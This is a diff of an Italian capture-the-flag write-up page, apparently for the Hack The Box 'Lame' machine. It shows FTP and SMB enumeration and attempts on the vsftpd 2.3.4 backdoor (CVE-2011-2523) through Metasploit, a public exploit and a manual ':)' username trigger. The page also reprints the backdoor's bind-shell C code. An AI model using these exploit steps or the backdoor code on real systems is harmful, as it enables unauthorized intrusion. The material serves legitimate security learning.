+</span></span><span class="line"><span class="cl">3632/tcp open  distccd     syn-ack ttl <span class="m">63</span> distccd v1 <span class="o">((</span>GNU<span class="o">)</span> 4.2.4 <span class="o">(</span>Ubuntu 4.2.4-1ubuntu4<span class="o">))</span></span></span></code></pre></div></div>
+<p>La seguente tabella riassume tutte le informazioni trovate finora:</p>
 <table>
   <thead>
       <tr>
@@ -1251,7 +1228,7 @@
   </tbody>
 </table>
 <p>Per accedere a un server FTP è necessario utilizzare un client compatibile con il protocollo. Su distribuzioni come Kali Linux è disponibile il software preinstallato <code>ftp</code>  che permette di stabilire una connessione al server come mostrato in seguito:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ftp <span class="nv">$IP</span>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ftp <span class="nv">$IP</span>
 </span></span><span class="line"><span class="cl">Connected to 10.10.10.3.
 </span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 2.3.4<span class="o">)</span>
 </span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.10.10.3:kali<span class="o">)</span>: anonymous
@@ -1260,15 +1237,15 @@
 </span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
 </span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
 </span></span><span class="line"><span class="cl">Using binary mode to transfer files.
-</span></span><span class="line"><span class="cl">ftp&gt;
-</span></span></code></pre></div><p>Purtroppo nella directory esposta dal server non sono presenti file come mostrato di seguito:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp&gt; ls -la
+</span></span><span class="line"><span class="cl">ftp&gt;</span></span></code></pre></div></div>
+<p>Purtroppo nella directory esposta dal server non sono presenti file come mostrato di seguito:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp&gt; ls -la
 </span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>39642<span class="p">|</span><span class="o">)</span>.
 </span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
 </span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">65534</span>        <span class="m">4096</span> Mar <span class="m">17</span>  <span class="m">2010</span> .
 </span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">65534</span>        <span class="m">4096</span> Mar <span class="m">17</span>  <span class="m">2010</span> ..
-</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
-</span></span></code></pre></div>
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.</span></span></code></pre></div></div>
+
 <h3 class="relative group">CVE-2011-2523
     <div id="cve-2011-2523" class="anchor"></div>
     
@@ -1278,14 +1255,9 @@
     </span>
     
 </h3>
-<p>Quando si valuta la sicurezza di un sistema è sempre opportuno verificare sempre se le versioni dei software installati siano affette da vulnerabilità note. Una rapida ricerca con Google rivela che la versione di vsFTPd installata sull&rsquo;host è vulnerabile alla <a
-  href="https://www.cve.org/CVERecord?id=CVE-2011-2523"
-    target="_blank"
-  >CVE-2011-2523</a> la cui descrizione viene riportata di seguito:</p>
-<blockquote>
-<p>vsftpd 2.3.4 downloaded between 20110630 and 20110703 contains a backdoor which opens a shell on port 6200/tcp.</p>
-</blockquote>
-<p>Le versioni di vsFTPd 2.3.4 distribuite tra il 30-06-2011 e il 03-07-2011 includono una backdoor che permette a un attaccante di aprire una shell sulla porta TCP 6200 dell&rsquo;host.</p>
+<p>Quando si valuta la sicurezza di un sistema è sempre opportuno verificare sempre se le versioni dei software installati siano affette da vulnerabilità note. Una rapida ricerca con Google rivela che la versione di vsFTPd installata sull&rsquo;host è vulnerabile alla <a href="https://www.cve.org/CVERecord?id=CVE-2011-2523"  target="_blank" rel="noreferrer">CVE-2011-2523</a> la cui descrizione viene riportata di seguito:</p>
+<blockquote><p>vsftpd 2.3.4 downloaded between 20110630 and 20110703 contains a backdoor which opens a shell on port 6200/tcp.</p>
+</blockquote><p>Le versioni di vsFTPd 2.3.4 distribuite tra il 30-06-2011 e il 03-07-2011 includono una backdoor che permette a un attaccante di aprire una shell sulla porta TCP 6200 dell&rsquo;host.</p>
 
 <h4 class="relative group">Metasploit
     <div id="metasploit" class="anchor"></div>
@@ -1298,7 +1270,7 @@
 </h4>
 <p>L&rsquo;approccio più immediato per sfruttare questa vulnerabilità è quello di utilizzare il framework Metasploit, che mette a disposizione un&rsquo;ampia raccolta di moduli per attaccare vulnerabilità note.</p>
 <p>Tramite l&rsquo;opzione <code>search &lt;software&gt; &lt;version&gt;</code> è possibile cercare se sono disponibili dei moduli pronti all&rsquo;uso:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; search vsftpd 2.3.4
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; search vsftpd 2.3.4
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Matching <span class="nv">Modules</span>
 </span></span><span class="line"><span class="cl"><span class="o">================</span>
@@ -1308,13 +1280,13 @@
 </span></span><span class="line"><span class="cl">   <span class="m">0</span>  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Interact with a module by name or index. For example info 0, use <span class="m">0</span> or use exploit/unix/ftp/vsftpd_234_backdoor
-</span></span></code></pre></div><p>In questo caso è disponibile il modulo <code>vsftpd_234_backdoor</code> che permette di attaccare la vulnerabilità individuata. Tramite l&rsquo;opzione <code>use &lt;nome_modulo&gt;</code> è possibile importare il modulo per iniziare a utilizzarlo:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor
+</span></span><span class="line"><span class="cl">Interact with a module by name or index. For example info 0, use <span class="m">0</span> or use exploit/unix/ftp/vsftpd_234_backdoor</span></span></code></pre></div></div>
+<p>In questo caso è disponibile il modulo <code>vsftpd_234_backdoor</code> che permette di attaccare la vulnerabilità individuata. Tramite l&rsquo;opzione <code>use &lt;nome_modulo&gt;</code> è possibile importare il modulo per iniziare a utilizzarlo:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to cmd/unix/interact
-</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/ftp/vsftpd_234_backdoor<span class="o">)</span> &gt;
-</span></span></code></pre></div><p>Prima di attaccare la vulnerabilità è necessario specificare il bersaglio dell&rsquo;attacco. Tramite l&rsquo;opzione <code>show options</code>  è possibile visualizzare i requisiti per lanciare l&rsquo;exploit:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/ftp/vsftpd_234_backdoor<span class="o">)</span> &gt; show options
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/ftp/vsftpd_234_backdoor<span class="o">)</span> &gt;</span></span></code></pre></div></div>
+<p>Prima di attaccare la vulnerabilità è necessario specificare il bersaglio dell&rsquo;attacco. Tramite l&rsquo;opzione <code>show options</code>  è possibile visualizzare i requisiti per lanciare l&rsquo;exploit:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/ftp/vsftpd_234_backdoor<span class="o">)</span> &gt; show options
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/unix/ftp/vsftpd_234_backdoor<span class="o">)</span>:
 </span></span><span class="line"><span class="cl">
@@ -1335,14 +1307,14 @@
 </span></span><span class="line"><span class="cl">   --  ----
 </span></span><span class="line"><span class="cl">   <span class="m">0</span>   Automatic
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">View the full module info with the info, or info -d command.
-</span></span></code></pre></div><p>In questo caso l&rsquo;unico valore richiesto è l&rsquo;IP del server bersaglio. Per impostarlo si usa l&rsquo;opzione <code>set RHOST &lt;target_ip&gt;</code> come mostrato in seguito. Per avviare l&rsquo;exploit si può usare l&rsquo;opzione <code>exploit</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/ftp/vsftpd_234_backdoor<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.10.10.3
+</span></span><span class="line"><span class="cl">View the full module info with the info, or info -d command.</span></span></code></pre></div></div>
+<p>In questo caso l&rsquo;unico valore richiesto è l&rsquo;IP del server bersaglio. Per impostarlo si usa l&rsquo;opzione <code>set RHOST &lt;target_ip&gt;</code> come mostrato in seguito. Per avviare l&rsquo;exploit si può usare l&rsquo;opzione <code>exploit</code>:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/ftp/vsftpd_234_backdoor<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.10.10.3
 </span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/ftp/vsftpd_234_backdoor<span class="o">)</span> &gt; exploit
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.10.3:21 - Banner: <span class="m">220</span> <span class="o">(</span>vsFTPd 2.3.4<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.10.3:21 - USER: <span class="m">331</span> Please specify the password.
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created.
-</span></span></code></pre></div><p>Dall&rsquo;output di Metasploit si nota che l&rsquo;exploit sembra essere andato a buon fine, ma nessuna sessione è stata creata ovvero nessuna shell è stata aperta sul target.</p>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created.</span></span></code></pre></div></div>
+<p>Dall&rsquo;output di Metasploit si nota che l&rsquo;exploit sembra essere andato a buon fine, ma nessuna sessione è stata creata ovvero nessuna shell è stata aperta sul target.</p>
 <p>Questo comportamento anomalo verrà approfondito in seguito nella sezione Extra, poiché richiede l&rsquo;accesso locale alla macchina e privilegi elevati per proseguire l&rsquo;analisi.</p>
 
 <h4 class="relative group">Exploit pubblico
@@ -1355,19 +1327,19 @@
     
 </h4>
 <p>Quando si analizzano le vulnerabilità di un sistema, uno dei primi passi è quello di verificare l&rsquo;esistenza di exploit documentati pubblicamente. Tramite lo strumento <code>searchsploit</code> è possibile consultare offline l&rsquo;archivio di Exploit-DB:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ searchsploit vsftpd 2.3.4
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ searchsploit vsftpd 2.3.4
 </span></span><span class="line"><span class="cl">----------------------------------------------------------------- ---------------------------------
 </span></span><span class="line"><span class="cl"> Exploit Title                                                   <span class="p">|</span>  Path
 </span></span><span class="line"><span class="cl">----------------------------------------------------------------- ---------------------------------
 </span></span><span class="line"><span class="cl">vsftpd 2.3.4 - Backdoor Command Execution                        <span class="p">|</span> unix/remote/49757.py
 </span></span><span class="line"><span class="cl">vsftpd 2.3.4 - Backdoor Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>           <span class="p">|</span> unix/remote/17491.rb
 </span></span><span class="line"><span class="cl">----------------------------------------------------------------- ---------------------------------
-</span></span><span class="line"><span class="cl">Shellcodes: No Results
-</span></span></code></pre></div><p>Dalla ricerca emergono 2 exploit associati alla vulnerabilità, uno dei quali corrisponde al modulo Metasploit usato in precedenza. Tramite <code>searchsploit -m &lt;exploit_id&gt;</code> è possibile copiare un exploit nella directory di lavoro corrente per avviarlo o apportare modifiche qualora fosse richiesto:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ searchsploit -m <span class="m">49757</span>
-</span></span></code></pre></div><p>Per lanciare l&rsquo;exploit è necessario solo indicare l&rsquo;indirizzo IP del bersaglio come nel caso di Metasploit:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python2 49757.py 10.10.10.3
-</span></span></code></pre></div><p>Anche in questo caso non si riceve alcuna risposta dal server e non si riesce a ottenere una shell sull&rsquo;host.</p>
+</span></span><span class="line"><span class="cl">Shellcodes: No Results</span></span></code></pre></div></div>
+<p>Dalla ricerca emergono 2 exploit associati alla vulnerabilità, uno dei quali corrisponde al modulo Metasploit usato in precedenza. Tramite <code>searchsploit -m &lt;exploit_id&gt;</code> è possibile copiare un exploit nella directory di lavoro corrente per avviarlo o apportare modifiche qualora fosse richiesto:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ searchsploit -m <span class="m">49757</span></span></span></code></pre></div></div>
+<p>Per lanciare l&rsquo;exploit è necessario solo indicare l&rsquo;indirizzo IP del bersaglio come nel caso di Metasploit:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python2 49757.py 10.10.10.3</span></span></code></pre></div></div>
+<p>Anche in questo caso non si riceve alcuna risposta dal server e non si riesce a ottenere una shell sull&rsquo;host.</p>
 
 <h4 class="relative group">Exploit manuale
     <div id="exploit-manuale" class="anchor"></div>
@@ -1382,7 +1354,7 @@
 <p>Tuttavia, una volta che una vulnerabilità viene resa pubblica, è solo questione di tempo prima che un exploit venga rilasciato pubblicamente o che un attaccante particolarmente competente o motivato riesca a capire come sfruttarla.</p>
 <p>Considerando uno scenario in cui non sono disponibili exploit pubblici per la vulnerabilità individuata, condurrò ora un&rsquo;analisi approfondita della CVE-2011-2523.</p>
 <p>La backdoor è stata inserita nel file <code>str.c</code>, all&rsquo;interno della funzione <code>str_contains_line()</code> riportata di seguito:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span>
 </span></span><span class="line"><span class="cl"><span class="nf">str_contains_line</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">mystr</span><span class="o">*</span> <span class="n">p_str</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">mystr</span><span class="o">*</span> <span class="n">p_line_str</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="k">static</span> <span class="k">struct</span> <span class="n">mystr</span> <span class="n">s_curr_line_str</span><span class="p">;</span>
@@ -1394,27 +1366,27 @@
 </span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="n">p_str</span><span class="o">-&gt;</span><span class="n">p_buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="mh">0x3a</span><span class="p">)</span> <span class="c1">// 0x3A = :
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">p_str</span><span class="o">-&gt;</span><span class="n">p_buf</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="mh">0x29</span><span class="p">))</span>   <span class="c1">// 0x29 = )
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl">    <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">p_str</span><span class="o">-&gt;</span><span class="n">p_buf</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="mh">0x29</span><span class="p">))</span>   <span class="c1">// 0x29 = )
+</span></span></span><span class="line"><span class="cl">    <span class="p">{</span>
 </span></span><span class="line"><span class="cl">      <span class="nf">vsf_sysutil_extra</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>Nel blocco <code>else if</code> viene controllato se nel campo username sono presenti consecutivamente i caratteri <code>0x3A</code> e <code>0x29</code> che corrispondono in ASCII rispettivamente a <code>:</code> e <code>)</code>.</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>Nel blocco <code>else if</code> viene controllato se nel campo username sono presenti consecutivamente i caratteri <code>0x3A</code> e <code>0x29</code> che corrispondono in ASCII rispettivamente a <code>:</code> e <code>)</code>.</p>
 <p>Di conseguenza quando lo username contiene la sequenza <code>:)</code> (smile), viene invocata la funzione <code>vsf_sysutil_extra()</code>, definita nel file <code>sysdeputil.c</code> e riportata di seguito:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span>
 </span></span><span class="line"><span class="cl"><span class="nf">vsf_sysutil_extra</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rfd</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  
 </span></span><span class="line"><span class="cl">  <span class="c1">// Creazione del socket TCP
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sa</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sa</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  
 </span></span><span class="line"><span class="cl">  <span class="c1">// Socket in ascolto sulla porta 6200 su tutte le interfacce
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sa</span><span class="p">));</span>
+</span></span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sa</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">  <span class="n">sa</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="n">sa</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="nf">htons</span><span class="p">(</span><span class="mi">6200</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="n">sa</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
@@ -1423,32 +1395,32 @@
 </span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">((</span><span class="nf">listen</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">100</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  
 </span></span><span class="line"><span class="cl">  <span class="c1">// Ciclo for infinito per accettare connessioni sulla porta aperta
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">for</span><span class="p">(;;)</span>
+</span></span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(;;)</span>
 </span></span><span class="line"><span class="cl">  <span class="p">{</span> 
 </span></span><span class="line"><span class="cl">    <span class="n">rfd</span> <span class="o">=</span> <span class="nf">accept</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> 
 </span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nf">close</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="nf">close</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">dup2</span><span class="p">(</span><span class="n">rfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="nf">dup2</span><span class="p">(</span><span class="n">rfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="nf">dup2</span><span class="p">(</span><span class="n">rfd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">execl</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="s">&#34;sh&#34;</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// Apre una shell
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span> 
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>Questa funzione crea un socket TCP in ascolto sulla porta 6200 del server su tutte le interfacce di rete. Quando riceve una connessione sulla porta in ascolto, viene aperta una shell per l&rsquo;utente consentendo l&rsquo;esecuzione di comandi arbitrari sul server (RCE).</p>
+</span></span></span><span class="line"><span class="cl">  <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>Questa funzione crea un socket TCP in ascolto sulla porta 6200 del server su tutte le interfacce di rete. Quando riceve una connessione sulla porta in ascolto, viene aperta una shell per l&rsquo;utente consentendo l&rsquo;esecuzione di comandi arbitrari sul server (RCE).</p>
 <p>Provando ora a connettermi al server con lo username <code>user:)</code> e una password arbitraria, si nota che dopo aver inserito la password non si ottiene più una risposta dal server come avvenuto in precedenza:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ftp <span class="nv">$IP</span>                  
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ftp <span class="nv">$IP</span>                  
 </span></span><span class="line"><span class="cl">Connected to 10.10.10.3.
 </span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 2.3.4<span class="o">)</span>
 </span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.10.10.3:kali<span class="o">)</span>: user:<span class="o">)</span>  
 </span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
-</span></span><span class="line"><span class="cl">Password: password
-</span></span></code></pre></div><p>Dopo aver atteso vari secondi, però il client chiude inaspettatamente la connessione con il server impedendo di ottenere una shell come descritto dalla vulnerabilità analizzata:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="m">421</span> Service not available, remote server timed out. Connection closed.
+</span></span><span class="line"><span class="cl">Password: password</span></span></code></pre></div></div>
+<p>Dopo aver atteso vari secondi, però il client chiude inaspettatamente la connessione con il server impedendo di ottenere una shell come descritto dalla vulnerabilità analizzata:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="m">421</span> Service not available, remote server timed out. Connection closed.
 </span></span><span class="line"><span class="cl">ftp: Login failed
-</span></span><span class="line"><span class="cl">ftp&gt; 
-</span></span></code></pre></div><p>Scansionando con <code>nmap</code> la porta TCP 6200, essa risulta non essere raggiungibile:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -p6200 <span class="nv">$IP</span>
+</span></span><span class="line"><span class="cl">ftp&gt; </span></span></code></pre></div></div>
+<p>Scansionando con <code>nmap</code> la porta TCP 6200, essa risulta non essere raggiungibile:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -p6200 <span class="nv">$IP</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">PORT     STATE    SERVICE
-</span></span><span class="line"><span class="cl">6200/tcp filtered lm-x
-</span></span></code></pre></div><p>Questo comportamento anomalo verrà approfondito in seguito nella sezione Extra, poiché richiede l&rsquo;accesso locale alla macchina e privilegi elevati per proseguire l&rsquo;analisi.</p>
+</span></span><span class="line"><span class="cl">6200/tcp filtered lm-x</span></span></code></pre></div></div>
+<p>Questo comportamento anomalo verrà approfondito in seguito nella sezione Extra, poiché richiede l&rsquo;accesso locale alla macchina e privilegi elevati per proseguire l&rsquo;analisi.</p>
 
 <h2 class="relative group">SMB (139,445)
     <div id="smb-139445" class="anchor"></div>
@@ -1463,7 +1435,7 @@
 <p>Tramite una sessione anonima è possibile individuare le directory condivise dal server (<em>shares</em>) e individuare i permessi posseduti su esse.</p>
 <p>Anche per accedere a un server SMB è richiesto un client compatibile con il protocollo. Su distribuzioni come Kali Linux è disponibile il software preinstallato <code>smbclient</code> che permette di stabilire una connessione al server e accedere a una directory condivisa.</p>
 <p>In alternativa software come <code>smbmap</code> permettono di enumerare velocemente le directory condivise e di elencarne i permessi disponibili:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ smbmap -H <span class="nv">$IP</span>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ smbmap -H <span class="nv">$IP</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> IP: 10.10.10.3:445  Name: 10.10.10.3                Status: Authenticated
 </span></span><span class="line"><span class="cl">    Disk      Permissions     Comment
@@ -1472,8 +1444,8 @@
 </span></span><span class="line"><span class="cl">    tmp       READ, WRITE     oh noes!
 </span></span><span class="line"><span class="cl">    opt       NO ACCESS
 </span></span><span class="line"><span class="cl">    IPC$      NO ACCESS       IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span>
-</span></span><span class="line"><span class="cl">    ADMIN$    NO ACCESS       IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span>
-</span></span></code></pre></div><p>Nella directory <code>tmp</code> sono disponibili permessi di lettura e scrittura con un accesso anonimo. Tuttavia dopo l&rsquo;accesso non è stato individuato alcun file rilevante nella directory esposta.</p>
+</span></span><span class="line"><span class="cl">    ADMIN$    NO ACCESS       IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span></span></span></code></pre></div></div>
+<p>Nella directory <code>tmp</code> sono disponibili permessi di lettura e scrittura con un accesso anonimo. Tuttavia dopo l&rsquo;accesso non è stato individuato alcun file rilevante nella directory esposta.</p>
 
 <h3 class="relative group">CVE-2007-2447
     <div id="cve-2007-2447" class="anchor"></div>
@@ -1484,14 +1456,9 @@
     </span>
     
 </h3>
-<p>Una rapida ricerca con Google rivela che la versione di Samba installata sull&rsquo;host è vulnerabile alla <a
-  href="https://www.samba.org/samba/security/CVE-2007-2447.html"
-    target="_blank"
-  >CVE-2007-2447</a> descritta di seguito:</p>
-<blockquote>
